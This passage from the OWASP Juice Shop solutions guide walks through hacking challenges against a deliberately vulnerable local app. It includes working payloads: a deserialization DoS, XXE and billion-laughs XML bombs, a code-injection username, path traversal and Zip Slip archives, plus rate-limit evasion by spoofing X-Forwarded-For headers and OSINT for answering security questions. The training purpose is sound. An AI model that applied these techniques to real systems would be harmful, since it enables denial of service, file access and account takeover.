JSON objects (<code>orderLines</code>) but also as a String (<code>orderLinesData</code>).</p>
</li>
<li>
<p>The given example for <code>orderLinesDate</code> indicates that this String
might be allowed to contain arbitrary JSON: <code>[{"productId":
12,"quantity": 10000,"customerReference": ["PO0000001.2",
"SM20180105|042"],"couponCode": "pes[Bh.u*t"},...]</code></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/swagger_models-order.png" alt="Swagger Order Model">
</div>
</div>
</li>
<li>
<p>Click the <em>Try it out</em> button and without changing anything click
<em>Execute</em> to see if and how the API is working. This will give you a
<code>401</code> error saying <code>No Authorization header was found</code>.</p>
</li>
<li>
<p>Go back to the application, log in as any user and copy your token
from the <code>Authorization Bearer</code> header using your browser&#8217;s DevTools.</p>
</li>
<li>
<p>Back at <a href="http://localhost:3000/api-docs/#/Order/post_orders" class="bare">http://localhost:3000/api-docs/#/Order/post_orders</a> click
<em>Authorize</em> and paste your token into the <code>Value</code> field.</p>
</li>
<li>
<p>Click <em>Try it out</em> and <em>Execute</em> to see a successful <code>200</code> response.</p>
</li>
<li>
<p>An insecure JSON deserialization would execute any function call
defined within the JSON String, so a possible payload for a DoS
attack would be an endless loop. Replace the example code with
<code>{"orderLinesData": "(function dos() { while(true); })()"}</code> in the
<em>Request Body</em> field. Click <em>Execute</em>.</p>
</li>
<li>
<p>The server should eventually respond with a <code>200</code> after roughly 2
seconds, because that is defined as a timeout so you do not really
DoS your Juice Shop server.</p>
</li>
<li>
<p>If your request successfully bumped into the infinite loop
protection, the challenge is marked as solved.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_reset_the_password_of_bjoerns_internal_account_via_the_forgot_password_mechanism"><a class="anchor" href="#_reset_the_password_of_bjoerns_internal_account_via_the_forgot_password_mechanism"></a>Reset the password of Bjoern&#8217;s internal account via the Forgot Password mechanism</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Trying to find out who "Bjoern" might be should quickly lead you to
the OWASP Juice Shop project leader and author of this ebook.</p>
</li>
<li>
<p>Visit <a href="https://www.facebook.com/bjoern.kimminich" class="bare">https://www.facebook.com/bjoern.kimminich</a> to immediately learn
that he is from the town of <em>Uetersen</em> in Germany.</p>
</li>
<li>
<p>Visit <a href="https://gist.github.com/9045923" class="bare">https://gist.github.com/9045923</a> or
<a href="https://pastebin.com/JL5E0RfX" class="bare">https://pastebin.com/JL5E0RfX</a> to find the source code of a (truly
amazing) game Bjoern wrote in Turbo Pascal in 1995 (when he was a
teenager) to learn his phone number area code of <em>04122</em> which
belongs to Uetersen. This is sufficient proof that you in fact are on
the right track.</p>
</li>
<li>
<p><a href="http://www.geopostcodes.com/Uetersen" class="bare">http://www.geopostcodes.com/Uetersen</a> will tell you that Uetersen has
ZIP code <em>25436</em>.</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/forgot-password" class="bare">http://localhost:3000/#/forgot-password</a> and provide
<code>bjoern@juice-sh.op</code> as your <em>Email</em>.</p>
</li>
<li>
<p>In the subsequently appearing form, provide <code>25436</code> as <em>Your
ZIP/postal code when you were a teenager?</em></p>
</li>
<li>
<p>Type and <em>New Password</em> and matching <em>Repeat New Password</em> followed
by hitting <em>Change</em> to <strong>not solve</strong> this challenge.</p>
</li>
<li>
<p>Bjoern added some obscurity to his security answer by using an
uncommon variant of the pre-unification format of
<a href="#postal-codes-in-germany">postal codes in Germany</a>.</p>
</li>
<li>
<p>Visit <a href="http://www.alte-postleitzahlen.de/uetersen" class="bare">http://www.alte-postleitzahlen.de/uetersen</a> to learn that
Uetersen&#8217;s old ZIP code was <code>W-2082</code>. This would not work as an
answer either. Bjoern used the written out variation: <code>West-2082</code>.</p>
</li>
<li>
<p>Change the answer to <em>Your ZIP/postal code when you were a
teenager?</em> into <code>West-2082</code> and click <em>Change</em> again to finally
solve this challenge.</p>
</li>
</ol>
</div>
<div class="sect3">
<h4 id="_postal_codes_in_germany"><a class="anchor" href="#_postal_codes_in_germany"></a>Postal codes in Germany</h4>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Postal codes in Germany, Postleitzahl (plural Postleitzahlen,
abbreviated to PLZ; literally "postal routing number"), since 1 July
1993 consist of five digits. The first two digits indicate the wider
area, the last three digits the postal district.</p>
</div>
<div class="paragraph">
<p>Before reunification, both the Federal Republic of Germany (FRG) and
the German Democratic Republic (GDR) used four-digit codes. Under a
transitional arrangement following reunification, between 1989 and
1993 postal codes in the west were prefixed with 'W', e.g.: W-1000
[Berlin] 30 (postal districts in western cities were separate from
the postal code) and those in the east with 'O' (for Ost), e.g.:
O-1xxx Berlin.<sup class="footnote" id="_footnote_4">[<a id="_footnoteref_4" class="footnote" href="#_footnotedef_4" title="View footnote.">4</a>]</sup></p>
</div>
</blockquote>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_reset_mortys_password_via_the_forgot_password_mechanism"><a class="anchor" href="#_reset_mortys_password_via_the_forgot_password_mechanism"></a>Reset Morty&#8217;s password via the Forgot Password mechanism</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Trying to find out who "Morty" might be should <em>eventually</em> lead you
to <em>Morty Smith</em> as the most likely user identity</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/Morty_Smith.jpg" alt="Morty Smith">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://rickandmorty.wikia.com/wiki/Morty" class="bare">http://rickandmorty.wikia.com/wiki/Morty</a> and skim through the
<a href="http://rickandmorty.wikia.com/wiki/Morty#Family">Family</a> section</p>
</li>
<li>
<p>It tells you that Morty had a dog named <em>Snuffles</em> which also goes by
the alias of <em>Snowball</em> for a while.</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/forgot-password" class="bare">http://localhost:3000/#/forgot-password</a> and provide
<code>morty@juice-sh.op</code> as your <em>Email</em></p>
</li>
<li>
<p>Create a word list of all mutations (including typical
"leet-speak"-variations!) of the strings <code>snuffles</code> and <code>snowball</code>
using only</p>
<div class="ulist">
<ul>
<li>
<p>lower case (<code>a-z</code>)</p>
</li>
<li>
<p>upper case (<code>A-Z</code>)</p>
</li>
<li>
<p>and digit characters (<code>0-9</code>)</p>
</li>
</ul>
</div>
</li>
<li>
<p>Write a script that iterates over the word list and sends well-formed
requests to <code>http://localhost:3000/rest/user/reset-password</code>. A rate
limiting mechanism will prevent you from sending more than 100
requests within 5 minutes, severely hampering your brute force
attack.</p>
</li>
<li>
<p>Change your script so that it provides a different
<code>X-Forwarded-For</code>-header in each request, as this takes precedence
over the client IP in determining the origin of a request.</p>
</li>
<li>
<p>Rerun your script you will notice at some point that the answer to
the security question is <code>5N0wb41L</code> and the challenge is marked as
solved.</p>
</li>
<li>
<p>Feel free to cancel the script execution at this point.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>📕: If you do not want to write your own script for this challenge, take
a look at
<a href="https://gist.github.com/philly-vanilly/70cd34a7686e4bb75b08d3caa1f6a820">juice-shop-mortys-question-brute-force.py</a>
which was kindly published as a Gist on GitHub by
<a href="https://github.com/philly-vanilly">philly-vanilly</a>.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Leet (or "1337"), also known as eleet or leetspeak, is a system of
modified spellings and verbiage used primarily on the Internet for
many phonetic languages. It uses some alphabetic characters to replace
others in ways thdev at play on the similarity of their glyphs via
reflection or other resemblance. Additionally, it modifies certain
words based on a system of suffixes and alternative meanings.</p>
</div>
<div class="paragraph">
<p>The term "leet" is derived from the word elite. The leet lexicon
involves a specialized form of symbolic writing. For example, leet
spellings of the word leet include 1337 and l33t; eleet may be spelled
31337 or 3l33t. Leet may also be considered a substitution cipher,
although many dialects or linguistic varieties exist in different
online communities.<sup class="footnote" id="_footnote_5">[<a id="_footnoteref_5" class="footnote" href="#_footnotedef_5" title="View footnote.">5</a>]</sup></p>
</div>
</blockquote>
</div>
</div>
<div class="sect2">
<h3 id="_deprive_the_shop_of_earnings_by_downloading_the_blueprint_for_one_of_its_products"><a class="anchor" href="#_deprive_the_shop_of_earnings_by_downloading_the_blueprint_for_one_of_its_products"></a>Deprive the shop of earnings by downloading the blueprint for one of its products</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>The description of the <em>OWASP Juice Shop Logo (3D-printed)</em> product
indicates that this product might actually have kind of a blueprint</p>
</li>
<li>
<p>Download the product image from
<a href="http://localhost:3000/public/images/products/3d_keychain.jpg" class="bare">http://localhost:3000/public/images/products/3d_keychain.jpg</a> and view
its <a href="https://en.wikipedia.org/wiki/Exif">Exif metadata</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/exif-3d_keychain.png" alt="3D printed logo Exif metadata">
</div>
</div>
</li>
<li>
<p>Researching the camera model entry <em>OpenSCAD</em> reveals that this is a
program to create 3D models, which works with <code>.stl</code> files</p>
</li>
<li>
<p>As no further hint on the blueprint filename or anything is given, a
lucky guess or brute force attack is your only choice</p>
</li>
<li>
<p>Download <a href="http://localhost:3000/assets/public/images/products/JuiceShop.stl" class="bare">http://localhost:3000/assets/public/images/products/JuiceShop.stl</a>
to solve this challenge</p>
</li>
<li>
<p>This model will actually allow you to 3D-print your own OWASP Juice
Shop logo models!</p>
<div class="paragraph">
<p><span class="image"><img src="../_images/appendix/JuiceShop.stl_surface.png" alt="JuiceShop.stl Surface Angle view"></span>
<span class="image"><img src="../_images/appendix/JuiceShop.stl_wireframe.png" alt="JuiceShop.stl Wireframe view"></span></p>
</div>
</li>
</ol>
</div>
<div class="paragraph">
<p>The official place to retrieve this and other media or artwork files
from the Juice Shop (and other OWASP projects or chapters) is
<a href="https://github.com/OWASP/owasp-swag" class="bare">https://github.com/OWASP/owasp-swag</a>. There you can not only find the
3D model leaked from this challenge, but also
<a href="https://github.com/OWASP/owasp-swag/blob/master/projects/juice-shop/3d/JuiceShop_KeyChain.stl">one that comes with a dedicated hole to mount it on your keyring</a>!</p>
</div>
</div>
<div class="sect2">
<h3 id="_inform_the_development_team_about_a_danger_to_some_of_their_credentials"><a class="anchor" href="#_inform_the_development_team_about_a_danger_to_some_of_their_credentials"></a>Inform the development team about a danger to some of their credentials</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve
<a href="#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a></p>
</li>
<li>
<p>The <code>package.json.bak</code> contains not only runtime dependencies but
also development dependencies under the <code>devDependencies</code> section.</p>
</li>
<li>
<p>Go through the list of <code>devDependencies</code> and perform research on
vulnerabilities in them which would allow a Software Supply Chain
Attack.</p>
</li>
<li>
<p>For the <code>eslint-scope</code> module you will learn about one such incident
exactly in the pinned version <code>3.7.2</code>, e.g.
<a href="https://status.npmjs.org/incidents/dn7c1fgrr7ng" class="bare">https://status.npmjs.org/incidents/dn7c1fgrr7ng</a> or
<a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes" class="bare">https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes</a></p>
</li>
<li>
<p>Both above links refer to the original report of this vulnerability
on GitHub: <a href="https://github.com/eslint/eslint-scope/issues/39" class="bare">https://github.com/eslint/eslint-scope/issues/39</a></p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a></p>
</li>
<li>
<p>Submit your feedback with
<code>https://github.com/eslint/eslint-scope/issues/39</code> in the comment to
solve this challenge</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_inform_the_shop_about_a_typosquatting_imposter_that_dug_itself_deep_into_the_frontend"><a class="anchor" href="#_inform_the_shop_about_a_typosquatting_imposter_that_dug_itself_deep_into_the_frontend"></a>Inform the shop about a typosquatting imposter that dug itself deep into the frontend</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Request <a href="http://localhost:3000/3rdpartylicenses.txt" class="bare">http://localhost:3000/3rdpartylicenses.txt</a> to retrieve the
3rd party license list generated by Angular CLI by default</p>
</li>
<li>
<p>Combing through the list of modules you will come across
<code>anuglar2-qrcode</code> which openly reveals its intent on
<a href="https://www.npmjs.com/package/anuglar2-qrcode" class="bare">https://www.npmjs.com/package/anuglar2-qrcode</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/npm_anuglar2-qrcode.png" alt="anuglar2-qrcode on NPM">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a></p>
</li>
<li>
<p>Submit your feedback with <code>anuglar2-qrcode</code> in the comment to solve
this challenge</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>You can probably imagine that the typosquatted <code>anuglar2-qrcode</code> would
be <em>a lot harder</em> to distinguish from the original repository
<code>ngx-bar-rating</code>, if it where not marked with the <em>THIS IS <strong>NOT</strong> THE
MODULE YOU ARE LOOKING FOR!</em>-warning at the very top. Below you can see
the original <code>ngx-bar-rating</code> module page on NPM:</p>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/npm_angular2-qrcode.png" alt="angular2-qrcode on NPM">
</div>
</div>
</div>
<div class="sect2">
<h3 id="_give_the_server_something_to_chew_on_for_quite_a_while"><a class="anchor" href="#_give_the_server_something_to_chew_on_for_quite_a_while"></a>Give the server something to chew on for quite a while</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve the
<a href="#use-a-deprecated-b2b-interface-that-was-not-properly-shut-down">Use a deprecated B2B interface that was not properly shut down</a>
challenge.</p>
</li>
<li>
<p>On Linux, prepare an XML file which defines and uses an external
entity which will require a long time to resolve: <code>&lt;!ENTITY xxe
SYSTEM "file:///dev/random"&gt;</code>. On Windows there is no similar feature
to retrieve randomness from the OS via an "endless" file, so the
attack vector has to be completely different. A <em>quadratic blowup</em>
attack works fine, consisting of a single large entity like <code>&lt;!ENTITY
a "dosdosdosdos...dos"</code>&gt; which is replicated very often as in
<code>&lt;foo&gt;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;...&amp;a;&lt;/foo&gt;</code>.</p>
</li>
<li>
<p>Upload this file through the <em>File Complaint</em> dialog and observe how
the request processing takes up to 2 seconds and then times out (to
prevent you from actually DoS&#8217;ing your application) but still solving
the challenge.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p><em>You might feel tempted to try the classic <strong>Billion laughs attack</strong> but
will quickly notice that the XML parser is hardened against it, giving
you a status <code>410</code> HTTP error saying <code>Detected an entity reference
loop</code>.</em></p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>In computer security, a billion laughs attack is a type of
denial-of-service (DoS) attack which is aimed at parsers of XML
documents.</p>
</div>
<div class="paragraph">
<p>It is also referred to as an XML bomb or as an exponential entity
expansion attack.</p>
</div>
<div class="paragraph">
<p>The example attack consists of defining 10 entities, each defined as
consisting of 10 of the previous entity, with the document consisting
of a single instance of the largest entity, which expands to one
billion copies of the first entity.</p>
</div>
<div class="paragraph">
<p>In the most frequently cited example, the first entity is the string
"lol", hence the name "billion laughs". The amount of computer memory
used would likely exceed that available to the process parsing the XML
(it certainly would have at the time the vulnerability was first
reported).</p>
</div>
<div class="paragraph">
<p>While the original form of the attack was aimed specifically at XML
parsers, the term may be applicable to similar subjects as well.</p>
</div>
<div class="paragraph">
<p>The problem was first reported as early as 2002, but began to be
widely addressed in 2008.</p>
</div>
<div class="paragraph">
<p>Defenses against this kind of attack include capping the memory
allocated in an individual parser if loss of the document is
acceptable, or treating entities symbolically and expanding them
lazily only when (and to the extent) their content is to be used.<sup class="footnote" id="_footnote_6">[<a id="_footnoteref_6" class="footnote" href="#_footnotedef_6" title="View footnote.">6</a>]</sup></p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-xml hljs" data-lang="xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE lolz [
&lt;!ENTITY lol "lol"&gt;
&lt;!ELEMENT lolz (#PCDATA)&gt;
&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre>
</div>
</div>
</blockquote>
</div>
</div>
<div class="sect2">
<h3 id="_permanently_disable_the_support_chatbot"><a class="anchor" href="#_permanently_disable_the_support_chatbot"></a>Permanently disable the support chatbot</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>The Chatbot is built using an npm module called 'juicy-chat-bot'. The
source code for the same can be found
<a href="https://github.com/juice-shop/juicy-chat-bot">here</a></p>
</li>
<li>
<p>Looking through the source, one can determine that user messages are
processed inside a VM context, with a function called <code>process</code></p>
</li>
<li>
<p>The vulnerable segment of the code is
<a href="https://github.com/juice-shop/juicy-chat-bot/blob/15e424609dc59ada5bf0c114ca7a5ffc718501cc/index.js#L31">this statement</a>,
that the bot uses to remember usernames. The command
<strong>this.factory.run(<code>users.addUser("${token}", "${name}")</code>)</strong> is
equivalent to an eval statement inside the VM context. This can be
exploited by including <code>"</code> and <code>)</code> in one&#8217;s username</p>
</li>
<li>
<p>If one sets their username to <strong>admin"); process=null;
users.addUser("1337", "test</strong>, the final statement that gets executed
would be</p>
<div class="paragraph">
<p><code>users.addUser("token", "admin");</code><br>
<code>process = null;</code><br>
<code>users.addUser("1337", "test")</code></p>
</div>
</li>
</ol>
</div>
<div class="paragraph">
<p>The process function, is therefore set to null and any further attempt
by the bot to process a user&#8217;s message would result in an error</p>
</div>
<div class="paragraph">
<p><span class="image"><img src="../_images/appendix/killed-chatbot.png" alt="Killed chatbot"></span>)</p>
</div>
</div>
<div class="sect2">
<h3 id="_gain_read_access_to_an_arbitrary_local_file_on_the_web_server"><a class="anchor" href="#_gain_read_access_to_an_arbitrary_local_file_on_the_web_server"></a>Gain read access to an arbitrary local file on the web server</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in with any user account and go to <em>Account</em> &gt; <em>Privacy and Security</em> &gt; <em>Request Data Erasure</em>.</p>
</li>
<li>
<p>Fill in the fields <em>Confirm Email Address</em> and <em>Answer</em> with random data and submit. Using your browser&#8217;s developer tools or an intercepting proxy, notice that a <code>POST</code> request is issued with two body parameters (<code>email</code> and <code>securityAnswer</code>)</p>
</li>
<li>
<p>Using your favorite fuzzing tool and wordlist, start to fuzz the body parameters.</p>
</li>
<li>
<p>Notice an unhandled <code>500 Internal Server Error</code> when a parameter <code>layout</code> is provided in the request. Also, notice that the error response says <code>Error: ENOENT: no such file or directory</code> indicating that we might have hit the LFR vulnerability. We can also see the full pathname of the file the application is trying to access: <code>&lt;root_directory&gt;/juice-shop/views/&lt;value_of_layout_parameter&gt;</code></p>
</li>
<li>
<p>Based on the previous error message, we can guess (or bruteforce) a valid filename. For example, issuing another <code>POST</code> request with the following body will solve the challenge: <code>layout=../package.json</code></p>
</li>
</ol>
</div>
<div class="paragraph">
<p>This vulnerability arises when ExpressJS is using Handlebars as a template engine and it can even lead to RCE in some cases. You can read more about it in this <a href="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/">blog post by Juice Shop&#8217;s former Google Summer of Code student Shoeb Patel</a>.</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenges_6"><a class="anchor" href="#_challenges_6"></a>⭐⭐⭐⭐⭐⭐ Challenges</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_overwrite_the_legal_information_file"><a class="anchor" href="#_overwrite_the_legal_information_file"></a>Overwrite the Legal Information file</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Combing through the updates of the
<a href="https://twitter.com/owasp_juiceshop">@owasp_juiceshop</a> Twitter
account you will notice
<a href="https://twitter.com/owasp_juiceshop/status/1107781073575002112" class="bare">https://twitter.com/owasp_juiceshop/status/1107781073575002112</a>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/tweet_zip-complaints.png" alt="Tweet advertising ZIP uploads in &quot;File Complaint&quot;">
</div>
</div>
</li>
<li>
<p>Researching ZIP-based vulnerabilities should also yield
<a href="https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf">Zip Slip</a> which
exploits directory traversal filenames in file archives.</p>
</li>
<li>
<p>As the Legal Information file you need to override lives in
<a href="http://localhost:3000/ftp/legal.md" class="bare">http://localhost:3000/ftp/legal.md</a> and uploading files via <em>File
Complaint</em> does not give any feedback where they are stored, an
iterative directory traversal approach is recommended.</p>
</li>
<li>
<p>Prepare a ZIP file (on Linux) with <code>zip exploit.zip ../ftp/legal.md</code>.</p>
</li>
<li>
<p>Log in as any user at <a href="http://localhost:3000/#/login" class="bare">http://localhost:3000/#/login</a>.</p>
</li>
<li>
<p>Click <em>Contact Us</em> and <em>Complain?</em> to get to the <em>File Complaint</em>
screen at <a href="http://localhost:3000/#/complain" class="bare">http://localhost:3000/#/complain</a>.</p>
</li>
<li>
<p>Type in any message and attach your ZIP file, then click <em>Submit</em>.</p>
</li>
<li>
<p>The challenge will <em>not</em> be solved. Repeat steps 5-7 but with <code>zip
exploit.zip ../../ftp/legal.md</code> as the payload.</p>
</li>
<li>
<p>The challenge will be marked as solved! When you visit
<a href="http://localhost:3000/ftp/legal.md" class="bare">http://localhost:3000/ftp/legal.md</a> you will see your overwritten
Legal Information!</p>
</li>
</ol>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Zip Slip is a form of directory traversal that can be exploited by
extracting files from an archive. The premise of the directory
traversal vulnerability is that an attacker can gain access to parts
of the file system outside of the target folder in which they should
reside. The attacker can then overwrite executable files and either
invoke them remotely or wait for the system or user to call them, thus
achieving <strong>remote command execution</strong> on the victim&#8217;s machine. The
vulnerability can also cause damage by overwriting configuration files
or other sensitive resources, and can be exploited on both client
(user) machines and servers. <sup class="footnote" id="_footnote_8">[<a id="_footnoteref_7" class="footnote" href="#_footnotedef_7" title="View footnote.">7</a>]</sup></p>
</div>
</blockquote>
</div>
</div>
<div class="sect2">
<h3 id="_forge_a_coupon_code_that_gives_you_a_discount_of_at_least_80"><a class="anchor" href="#_forge_a_coupon_code_that_gives_you_a_discount_of_at_least_80"></a>Forge a coupon code that gives you a discount of at least 80%</h3>
<div class="paragraph">
<p>For this challenge there are actually two distinct <em>solution paths</em> that
are both viable. These will be explained separately as they utilize
totally different attack styles.</p>
</div>
<div class="sect3">
<h4 id="_pattern_analysis_solution_path"><a class="anchor" href="#_pattern_analysis_solution_path"></a><em>Pattern analysis</em> solution path</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve challenge
<a href="#access-a-salesmans-forgotten-backup-file">Access a salesman&#8217;s forgotten backup file</a>
to get the <code>coupons_2013.md.bak</code> file with old coupon codes which you
find listed below.</p>
</li>
<li>
<p>There is an obvious pattern in the last characters, as the first
eleven codes end with <code>gC7sn</code> and the last with <code>gC7ss</code>.</p>
</li>
<li>
<p>You can rightfully speculate that the last five characters represent
the actual discount value. The change in the last character for the
12th code comes from a different (probably higher) discount in
December! 🎅</p>
</li>
<li>
<p>Check the official Juice Shop Twitter account for a valid coupon
code: <a href="https://twitter.com/owasp_juiceshop" class="bare">https://twitter.com/owasp_juiceshop</a></p>
</li>
<li>
<p>At the time of this writing - January 2017 - the broadcasted coupon
was <code>n&lt;Mibh.u)v</code> promising a 50% discount.</p>
</li>
<li>
<p>Assuming that the discount value is encoded in the last 2-5
characters of the code, you could now start a trial-end-error or
brute force attack generating codes and try redeeming them on the
<em>Your Basket</em> page. At some point you will probably hit one that
gives 80% or more discount.</p>
</li>
<li>
<p>You need to <em>Checkout</em> after redeeming your code to solve the
challenge.</p>
</li>
</ol>
</div>
<div class="listingblock">
<div class="content">
<pre> n&lt;MibgC7sn
 mNYS#gC7sn
 o*IVigC7sn
 k#pDlgC7sn
 o*I]pgC7sn
 n(XRvgC7sn
 n(XLtgC7sn
 k#*AfgC7sn
 q:&lt;IqgC7sn
 pEw8ogC7sn
 pes[BgC7sn
 l}6D$gC7ss</pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_reverse_engineering_solution_path"><a class="anchor" href="#_reverse_engineering_solution_path"></a><em>Reverse engineering</em> solution path</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Going through the dependencies mentioned in <code>package.json.bak</code> you
can speculate that at least one of them could be involved in the
coupon code generation.</p>
</li>
<li>
<p>Narrowing the dependencies down to crypto or hashing libraries you
would end up with <code>hashids</code>, <code>jsonwebtoken</code> and <code>z85</code> as candidates.</p>
</li>
<li>
<p>It turns out that <code>z85</code>
(<a href="https://rfc.zeromq.org/spec:32/Z85/">ZeroMQ Base-85 Encoding</a>) was
chosen as the coupon code-creation algorithm.</p>
</li>
<li>
<p>Visit <a href="https://www.npmjs.com/package/z85" class="bare">https://www.npmjs.com/package/z85</a> and check the <em>Dependents</em>
tab:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/z85-dependents.png" alt="Dependents of z85 on npmjs.com">
</div>
</div>
</li>
<li>
<p>If you have Node.js installed locally run <code>npm install -g z85-cli</code> to
install <a href="https://www.npmjs.com/package/z85-cli" class="bare">https://www.npmjs.com/package/z85-cli</a> - a simple command
line interface for <code>z85</code>:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/z85-cli.png" alt="z85-cli page on npmjs.com">
</div>
</div>
</li>
<li>
<p>Check the official Juice Shop Twitter account
<a href="https://twitter.com/owasp_juiceshop" class="bare">https://twitter.com/owasp_juiceshop</a> for a valid coupon code. At the
time of this writing - January 2017 - the broadcasted coupon was
<code>n&lt;Mibh.u)v</code> promising a 50% discount.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/coupon_code-january2017.png" alt="Coupon Code for January 2017 on @owasp_juiceshop">
</div>
</div>
</li>
<li>
<p>Decrypting this code with <code>z85 -d "n&lt;Mibh.u)v"</code> returns <code>JAN17-50</code></p>
</li>
<li>
<p>Encrypt a code valid for the current month with 80% or more discount,
e.g. <code>z85 -e JAN17-80</code> which yields <code>n&lt;Mibh.v0y</code>.</p>
</li>
<li>
<p>Enter and redeem the generated code on the <em>Your Basket</em> page and
<em>Checkout</em> to solve the challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect3">
<h4 id="_cloud_computing_solution_path"><a class="anchor" href="#_cloud_computing_solution_path"></a><em>Cloud computing</em> solution path</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>From February 2019 onward the monthly coupon tweets begin with a
robot face emoji in square brackets. Maybe the Juice Shop sales team
forgot to send coupons too often so that the process was automated at
some point?</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/coupon_tweet_bot.png" alt="Coupon tweeted by a bot">
</div>
</div>
</li>
<li>
<p>Some Internet research will bring you to the
<a href="https://www.npmjs.com/package/juicy-coupon-bot">NPM module <code>juicy-coupon-bot</code></a>
and its associated GitHub repository
<a href="https://github.com/juice-shop/juicy-coupon-bot" class="bare">https://github.com/juice-shop/juicy-coupon-bot</a>. ℹ️ <em>As this is
not part of the Juice Shop repo itself and it is publicly accessible,
analyzing this repository is <strong>not</strong> considered cheating!</em></p>
</li>
<li>
<p>Open the
<a href="https://github.com/juice-shop/juicy-coupon-bot/blob/master/.github/workflows/coupon-distribution.yml"><code>.github/workflows/coupon-distribution.yml</code></a>
to see how the bot&#8217;s <em>Monthly Coupon Distribution</em> workflow is set
up. You can also look at the job results and logs at
<a href="https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22" class="bare">https://github.com/juice-shop/juicy-coupon-bot/actions?query=workflow%3A%22Monthly+Coupon+Distribution%22</a>.</p>
</li>
<li>
<p>If you read the logs of the <em>Distribute coupons</em> step, you will
notice an <code>info: [✔] API lookup success</code> message at the very
beginning. But where exactly does the bot get its coupon code from?</p>
</li>
<li>
<p>Read the code of the <code>juicy-coupon-bot</code> carefully and optionally try
to play with it locally after installing it via <code>npm i -g
juicy-coupon-bot</code>. You can learn a few things that way:</p>
<div class="ulist">
<ul>
<li>
<p>Running <code>juicy-coupon-bot</code> locally will
